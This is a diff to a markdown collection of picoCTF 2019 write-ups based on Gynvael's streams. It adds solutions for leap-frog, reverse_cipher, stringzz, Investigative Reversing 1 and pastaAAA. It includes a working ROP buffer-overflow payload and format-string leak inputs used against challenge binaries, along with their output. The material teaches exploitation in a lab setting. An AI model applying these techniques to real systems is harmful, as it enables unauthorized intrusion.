@@ -66,6 +66,11 @@ Title                                                                      | Cat
 [miniRSA                     ](#minirsa---cryptography)                    | Crypto           | 300    | [Part 5 (1:01:08)](https://youtu.be/gNvvZhpYHpw?t=1h01m08s)
 [mus1c                       ](#mus1c---general-skills)                    | General          | 300    | [Part 5 (1:17:45)](https://youtu.be/gNvvZhpYHpw?t=1h17m45s)
 [shark on the wire 2         ](#shark-on-the-wire-2---forensics)           | Forensics        | 300    | [Part 5 (1:29:57)](https://youtu.be/gNvvZhpYHpw?t=1h29m57s)
+[leap-frog                   ](#leap-frog---binary-exploitation)           | Binary           | 300    | [Part 6 (31:24)](https://youtu.be/rK2y0wMS_9w?t=31m24s)
+[reverse_cipher              ](#reverse_cipher---reverse-engineering)      | Reversing        | 300    | [Part 6 (1:00:27)](https://youtu.be/rK2y0wMS_9w?t=1h00m27s)
+[stringzz                    ](#stringzz---binary-exploitation)            | Binary           | 300    | [Part 6 (1:13:13)](https://youtu.be/rK2y0wMS_9w?t=1h13m13s)
+[Investigative Reversing 1   ](#investigative-reversing-1---forensics)     | Forensics        | 350    | [Part 6 (1:30:43)](https://youtu.be/rK2y0wMS_9w?t=1h30m43s)
+[pastaAAA                    ](#pastaaa---forensics)                       | Forensics        | 350    | [Part 6 (1:43:42)](https://youtu.be/rK2y0wMS_9w?t=1h43m42s)
 
 ## Note:
 If you're following along with your own picoctf account and solving challenges, not all values in the writeups will be the same as yours. For example, the last few characters of the flags are randomized, problem paths in the shell server are different for each user, and for the asm reversing problems, the values you get are different.
@@ -2637,6 +2642,496 @@ picoCTF{p1LLf3r3d_dt_v1_st3g0}
 
 When we submit `picoCTF{p1LLf3r3d_dt_v1_st3g0}` as the flag, it seems to be incorrect. We probably removed too many a's. With a bit of guesing we figure out that that the `dt` part of the flag should be `data` and that `v1` should be `v1a` (via), which makes the actual flag `picoCTF{p1LLf3r3d_data_v1a_st3g0}`.
 
+## leap-frog - Binary Exploitation
+```console
+$ checksec --file ./rop
+[*] '/problems/leap-frog_0_b02581eeadf3f35f4356e23db08bddf9/rop'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+```
+NX enabled means stack is writeable but not executable and No PIE means no ASLR.  
+
+gets() is still the vulnerable code in vuln(). This means we can still use \x00 bytes.  
+
+Our goal is to execute the display_flag() function:
+```c
+void display_flag() {
+  char flag[FLAG_SIZE];
+  FILE *file;
+  file = fopen("flag.txt", "r");
+  if (file == NULL) {
+    printf("'flag.txt' missing in the current directory!\n");
+    exit(0);
+  }
+
+  fgets(flag, sizeof(flag), file);
+
+  if (win1 && win2 && win3) {
+    printf("%s", flag);
+    return;
+  }
+  else if (win1 || win3) {
+    printf("Nice Try! You're Getting There!\n");
+  }
+  else {
+    printf("You won't get the flag that easy..\n");
+  }
+}
+```
+
+
+It looks like it looks to see if these global variables are set (non-zero):
+```c
+bool win1 = false;
+bool win2 = false;
+bool win3 = false;
+```
+
+These functions are provided to set the above variables, but we don't have to use them:
+```c
+void leapA() {
+  win1 = true;
+}
+
+void leap2(unsigned int arg_check) {
+  if (win3 && arg_check == 0xDEADBEEF) {
+    win2 = true;
+  }
+  else if (win3) {
+    printf("Wrong Argument. Try Again.\n");
+  }
+  else {
+    printf("Nope. Try a little bit harder.\n");
+  }
+}
+
+void leap3() {
+  if (win1 && !win1) {
+    win3 = true;
+  }
+  else {
+    printf("Nope. Try a little bit harder.\n");
+  }
+}
+```
+
+Setting arguments is boring according to Gynvael, so he wants to use gets() on the address of win1 to set all 3 global variables since they are adjacent to each other in memory. Then we can just call the display_flag() function. If we look at the assembly we see that ` test   %al,%al` is used to check the global variables. This only tests to make sure the global vars are non zero, so we can use any non zero value to overwrite the 3 global variables.  
+
+Find the address of gets() using IDA or objdump or Ghidra.
+```console
+$ objdump -d ./rop
+...
+08048430 <gets@plt>:
+...
+080486b3 <display_flag>:
+...
+```
+
+The address of gets is 0x08048430. The address of display_flag is 0x080486b3. Gynvael uses IDA to look for the address of win1, but you can use gdb as well:
+```console
+$ gdb ./rop
+(gdb) p &win1
+$1 = (<data variable, no debug info> *) 0x804a03d <win1>
+```
+
+So 0x804a03d is the address of win1.   
+
+Let's look at the assembly for vuln() so we know what the stack will look like after the gets() call (you can use objdump or IDA like Gynvael does)
+```assembly
+08048791 <vuln>:
+ 8048791:       55                      push   %ebp
+ 8048792:       89 e5                   mov    %esp,%ebp
+ 8048794:       53                      push   %ebx
+ 8048795:       83 ec 14                sub    $0x14,%esp
+ 8048798:       e8 83 fd ff ff          call   8048520 <__x86.get_pc_thunk.bx>
+ 804879d:       81 c3 63 18 00 00       add    $0x1863,%ebx
+ 80487a3:       83 ec 0c                sub    $0xc,%esp
+ 80487a6:       8d 83 7b e9 ff ff       lea    -0x1685(%ebx),%eax
+ 80487ac:       50                      push   %eax
+ 80487ad:       e8 6e fc ff ff          call   8048420 <printf@plt>
+ 80487b2:       83 c4 10                add    $0x10,%esp
+ 80487b5:       83 ec 0c                sub    $0xc,%esp
+ 80487b8:       8d 45 e8                lea    -0x18(%ebp),%eax
+ 80487bb:       50                      push   %eax
+ 80487bc:       e8 6f fc ff ff          call   8048430 <gets@plt>
+ 80487c1:       83 c4 10                add    $0x10,%esp
+ 80487c4:       8b 5d fc                mov    -0x4(%ebp),%ebx
+ 80487c7:       c9                      leave
+ 80487c8:       c3                      ret
+ ```
+
+Here is what we want the stack to look like:
+[ buf buffer + other stuff ]
+[    address of gets()     ] # When ret is called when vuln() returns, this address will be popped off the stack
+[ address of display_flag()] # This is what is popped into eip after and executed after gets() returns
+[    address of  win1      ] # This is the argument of gets()
+
+Here's the exploit:
+
+`\x30\x84\x04\x08\xb3\x86\x04\x08\x3d\xa0\x04\x08\nABC\n # New lines are so that get stops getting input`
+
+We need some padding to overflow the buffer (Gynvael uses IDA to look at the stack and determine the amount needed):
+`AAAAAAAAAAAAAAAABBBBCCCCDDDD\x30\x84\x04\x08\xb3\x86\x04\x08\x3d\xa0\x04\x08\nABC\n`
+
+Use echo to send it to the binary:
+```console
+$ echo -e -n 'AAAAAAAAAAAAAAAABBBBCCCCDDDD\x30\x84\x04\x08\xb3\x86\x04\x08\x3d\xa0\x04\x08\nABC\n' # -e is for interpreting the \x and the -n is to omit new line
+```
+
+Get the flag:
+```
+$ echo -e -n 'AAAAAAAAAAAAAAAABBBBCCCCDDDD\x30\x84\x04\x08\xb3\x86\x04\x08\x3d\xa0\x04\x08\nABC\n' | ./rop
+Enter your input> picoCTF{h0p_r0p_t0p_y0uR_w4y_t0_v1ct0rY_8783895b}
+Segmentation fault (core dumped)
+```
+
+If we wanted to do it "properly", we would first put the address of leapA(), then the middle of leap3(), then leap2() with the right arguments and bytes (since there will be pop ebp instructions). Since leap3 has a `mov ebx, ebp + 4`, we would just have to put an address that is actually readable so the program doesn't crash.  
+
+A viewer asked if it's possible to jump to directly into the display_flag(). It might be possible since the program stores the flag in memory even before it checks if the win vars were set. However, it probably would be difficult due to a few reasons. One is that ASLR still affects the stack, just not the binary.
+
+## reverse_cipher - Reverse Engineering
+We get a file and a x64 binary. The rev file contains part of the flag:
+```console
+$ less rev_this
+picoCTF{w1{1wq83k055j5f}
+rev_this (END)
+$ file rev
+rev: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=523d51973c11197605c76f84d4afb0fe9e59338c, not stripped
+```
+
+Gynvael uses IDA to look at at the binary and sees that it appends to the rev_this file.
+
+Part of the decompilation (using Ghidra since I don't have IDA):
+```c
+local_20 = fopen("flag.txt","r");
+local_28 = fopen("rev_this","a");
+if (local_20 == (FILE *)0x0) {
+  puts("No flag found, please make sure this is run on the server");
+}
+if (local_28 == (FILE *)0x0) {
+  puts("please run this on the server");
+}
+```
+
+Reads 24 bytes or 0x18 bytes
+```c
+sVar1 = fread(local_58,0x18,1,local_20)
+```
+
+Just copies first 8 bytes
+```c
+local_10 = 0;
+while (local_10 < 8) {
+  local_9 = local_58[local_10];
+  fputc((int)local_9,local_28);
+  local_10 = local_10 + 1;
+}
+```
+
+The following just checks whether the index is even or odd. If it's odd it decrements by 2 and if it's even it adds 5. Do this for the rest of the bytes in flag:
+```c
+local_14 = 8;
+while ((int)local_14 < 0x17) {
+  if ((local_14 & 1) == 0) {
+    local_9 = local_58[(int)local_14] + '\x05';
+  }
+  else {
+    local_9 = local_58[(int)local_14] + -2;
+  }
+  fputc((int)local_9,local_28);
+  local_14 = local_14 + 1;
+}
+```
+
+Use python to reverse the operations above (add instead of subtract, subtract instead of add):
+```c
+d = bytearray(open("rev_this", "rb").read())
+
+for i in range(8, 23):
+  if i % 2 == 0:
+    d[i] -= 5
+  else:
+    d[i] += 2
+
+print(d)
+```
+
+```console
+$ python3 asdf.py
+bytearray(b'picoCTF{r3v3rs35f207e7a}')
+```
+
+## stringzz - Binary Exploitation
+```console
+$ checksec --file=./vuln
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols
+Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   80 Symbols   
+$ file vuln
+vuln: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, for GNU/Linux 3.2.0, BuildID[sha1]=a716593e6e1b674f3f5c310077ba3da3fae42650, not stripped    
+```
+
+All protections are enabled :) 
+
+Source:
+```c
+int main (int argc, char **argv)
+{
+    puts("input whatever string you want; then it will be printed back:\n");
+    int read;
+    unsigned int len;
+    char *input = NULL;
+    getline(&input, &len, stdin);
+    //There is no win function, but the flag is wandering in the memory!
+    char * buf = malloc(sizeof(char)*FLAG_BUFFER);
+    FILE *f = fopen("flag.txt","r");
+    fgets(buf,FLAG_BUFFER,f);
+    printMessage1(input); // Basicallly printf(input);
+    fflush(stdout);
+}
+```
+
+`printMessage1(input);` basically calls printf(input) which is the format string bug. In order to be able to exploit the format string vulnerability, you need to be able to control the format string (`input` in this case) and also the stack after `input`.  
+
+Some handy format strings for exploitation:
+`%7$s` takes the 7th item on the stack and reads from that address
+`%n` writes an int
+`%hn` writes a short
+`%hhn` writes a byte
+You write the number of outputted bytes using the %n above.
+
+E.g. `printf("AAAA%n", asdf)` would write 4 bytes to asdf  
+
+This line of code puts the address of the flag onto the stack which fulfills the requirement listed above.
+```c
+char * buf = malloc(sizeof(char)*FLAG_BUFFER);
+``` 
+
+Let's test the program:
+```console
+$ echo '%x' | ./vuln
+input whatever string you want; then it will be printed back:
+
+Now
+your input
+will be printed:
+
+a
+```
+Since `a` is printed out, it means that there was a decimal 10 somewhere on the stack. This shows us that there is indeed a format string vulnerability in the program.  
+
+This tries to read from the first thing on the stack. It crashes because the program is trying to read from address 0xa.
+```console
+$ echo '%1$s' | ./vuln
+input whatever string you want; then it will be printed back:
+
+Now
+your input
+will be printed:
+
+Segmentation fault (core dumped)
+```
+
+Now we can just incrementing the 1 in `'%1$s'` until we find the location of the flag.
+```console
+$ echo '%2$s' | ./vuln
+input whatever string you want; then it will be printed back:
+
+Now
+your input
+will be printed:
+
+Ǖ
+$ echo '%3$s' | ./vuln
+input whatever string you want; then it will be printed back:
+
+Now
+your input
+will be printed:
+
+û
+$ echo '%4$s' | ./vuln
+input whatever string you want; then it will be printed back:
+
+Now
+your input
+will be printed:
+
+lM
+echo '$%5$s' | ./vuln
+input whatever string you want; then it will be printed back:
+
+Now
+your input
+will be printed:
+
+
+```
+and so on...  
+
+Gynvael keeps doing this until he gets to 37:
+```console
+$ echo '%37$s' | ./vuln
+input whatever string you want; then it will be printed back:
+
+Now
+your input
+will be printed:
+
+picoCTF{str1nG_CH3353_0814bc7c}
+```
+
+If you needed to, you could probably just script it to make it faster.  
+
+## Investigative Reversing 1 - Forensics
+If you look at the ends of the 3 pngs given, you'll notice that there seems to be parts of the flag at the end of the file.  
+
+PNGs are encoded in chunks which contain the size, name, and checksum of the chunks. At the end of the PNGs, each PNG has a chunk ending in the the same checksum: `AE 42 60 82`. So anything after these bytes are part of the flag. Here are the ending bytes from each of PNGs:  
+
+mystery.png: `CF{An1_37d24ffd}`  
+mystery1.png: 0x85 0x73  
+mystery2.png: `icT0tha_`  
+
+Now open the binary in IDA (or ghidra) and decompile:
+
+Opens the files:
+```c
+  stream = fopen("flag.txt","r");
+  f = fopen("mystery.png","a");
+  g = fopen("mystery2.png","a");
+  h = fopen("mystery3.png","a");
+```
+
+Reads the flag.txt:
+```c
+fread(local_38,0x1a,1,stream);
+```
+
+The following just takes three chars of the flag and output into h, or mystery3.png:
+```c
+fputc((int)local_38[1],h);
+...
+fputc((int)local_38[2],h);
+...
+fputc((int)local_33,h);
+...
+```
+
+Then this takes chars from 10 to 14 and put it in h (mystery3.png)
+```c
+local_64 = 10;
+while (local_64 < 0xf) {
+  fputc((int)local_38[local_64],h);
+  local_64 = local_64 + 1;
+}
+```
+That means `0tha_` are the 10th to 14th chars from flag.txt.  
+
+The flag should look something like this:
+`picoCTF{AAAAAAAAAAAAAAAAAAAAAAAAA}` where the A's are just placeholder characters.  
+
+Now that we know that `0tha_` is from index 10 to 15, then we can replace the A's to form the following:
+```picoCTF{AA0tha_AAAAAAAAAA}```
+
+This takes characters from index 6 to 9 from flag.txt and writes to f (mystery.png):
+```c
+local_68 = 6;
+while (local_68 < 10) {
+  local_6b = local_6b + '\x01';
+  fputc((int)local_38[local_68],f);
+  local_68 = local_68 + 1;
+}
+```
+
+That means that the chars from above would look something like `F{AA` which matches closely with `F{An` from mystery.png. So we combine that with what we have already for the flag:
+```
+picoCTF{An0tha_AAAAAAAAAA}
+```
+
+This goes from 15 to the end of the flag and appends it to the end of f (mystery.png):
+```c
+local_60 = 0xf;
+while (local_60 < 0x1a) {
+  fputc((int)local_38[local_60],f);
+  local_60 = local_60 + 1;
+}
+```
+So we know that `1_37d24ffd}` is from 15 to the end of the flag. When we combine it we get this:
+```
+picoCTF{An0tha_1_37d24ffd}
+```
+And there's the flag.
+
+## pastaAAA - Forensics
+We get a PNG of some pasta. Gynvael notices that there is some weird banding (gradients that are not smooth color transitions) on the right side of the image, which means there's something weird that happened.  
+
+Looking in a hexeditor shows that there are normal headers and the end is normal.   
+
+A good technique Gynvael recommends is to run a reverse image search on the image for CTFs to see if you can find the original image. The first search image doesn't work too well (image.google.com). But [https://tineye.com] is a search engine that looks for images that look identical to the one that you give. He finds that the image is just a stock image and so it doesn't look like the reverse image search won't do any good for this challenge.  
+
+When inspecting the image a second time, Gynvael notices a 'p' towards the left of the image. The challenge is more of a steganography challenge rather than a file format challenge.  
+
+Open up the image in GIMP and do some "Image magic."  
+
+Colors -> Curves. Notice that the image is highly segmented. We see some letters, but we can't seem to get the full flag.  
+
+Use GIMP to save the png as a .raw (planar).
+
+Use python to try separating the bit planes:
+```python
+d = bytearray(open("ctf.raw", "rb").read())
+
+a = []
+
+# Make 8 copies in a bytearray
+for _ in range(8):
+  a.append(bytearray(len(d)))
+
+
+for i, byte in enumerate(d):
+  for j in range(8):
+    bit = ((byte >> j) & 1) # Extract a bit
+    a[j][i] = bit * 255
+
+for i in range(8):
+  with open("plane%i.raw" % i, "wb") as f:
+    f.write(a[i])
+```
+
+```console
+$ python3 go.py
+$ ls
+ctf.png  ctf.raw  go.py  plane0.raw  plane1.raw  plane2.raw  plane3.raw  plane4.raw  plane5.raw  plane6.raw  plane7.raw
+```
+
+Open the raw image as planar 24 bpp (3 bytes per pixel) as a 826x620 image. The bottom 3 planes seem to contain the flag. Change the script to only get the bottom 3 planes and combine them:
+```python
+d = bytearray(open("ctf.raw", "rb").read())
+
+a = []
+
+# Make 8 copies in a bytearray
+for _ in range(8):
+  a.append(bytearray(len(d)))
+
+
+for i, byte in enumerate(d):
+  for j in range(3):
+    bit = ((byte >> j) & 1) # Extract a bit
+    a[0][i] |= bit << (j + 5)
+
+# for i in range(8):
+#   with open("plane%i.raw" % i, "wb") as f:
+#     f.write(a[i])
+with open("output.raw", "wb") as f:
+  f.write(a[0])
+```
+
+Open the output.raw file (Gynvael seems to use [IrfanView](https://www.irfanview.com)).  
+
+In this steganography challenge, data was hidden in the least 3 significant bits. The banding we saw earlier was because the detail was lost with the removal of these 3 bottom bits per pixel.
 
 ## Random other stuff Gynvael says about solving ctf challenges during the stream
 * He recommends kaitai struct for stegno challenges (Part 1: 46:39)
@@ -2647,9 +3142,12 @@ When we submit `picoCTF{p1LLf3r3d_dt_v1_st3g0}` as the flag, it seems to be inco
 * On 64-bit binary exploitation challenges, when passing parameters to functions, ROP is usually the way to get the proper values into registers.
 * calling exit() still means the destructors are still called. An attacker can use the destructor call to their advantage. Use \_exit instead with the underscore.
 * In part 5, Gynvael mentions a security bug called Http parameter pollution. While looking at JSON data, Gynvael points out how when there are keys with the same name, then there could be a security bug since some parsers might just return the first key-value pair while another parser might return the second key-value pair.
+* According to Gynvael there are only certain operations used for standard reverse engineering challenges:
+  1. add sub
+  2. rol ror (rotate bits (not same as shift))
+  3. xor
+* `FILE *f = fopen("flag.txt","r");` can make a the flag appear in a buffer in libc. There's a buffer for a given file in libc.
+
 
 ## TODO 
 * Fix all the weird non ascii apostrophes and double quotes
-
-
-
